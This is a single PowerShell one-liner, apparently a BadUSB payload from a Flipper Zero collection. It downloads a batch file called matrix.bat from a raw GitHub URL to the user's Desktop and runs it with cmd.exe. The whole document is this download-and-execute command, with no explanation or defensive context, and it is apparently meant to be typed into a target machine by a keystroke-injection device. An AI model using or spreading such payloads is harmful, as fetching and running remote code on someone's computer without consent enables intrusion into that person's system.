$DesktopPath = [Environment]::GetFolderPath("Desktop"); Invoke-WebRequest -Uri https://raw.githubusercontent.com/SeenKid/flipper-zero-bad-usb/main/utils/files/matrix.bat -OutFile "$DesktopPath/matrix.bat"; Start-Process "cmd.exe"  "/c $DesktopPath/matrix.bat;"
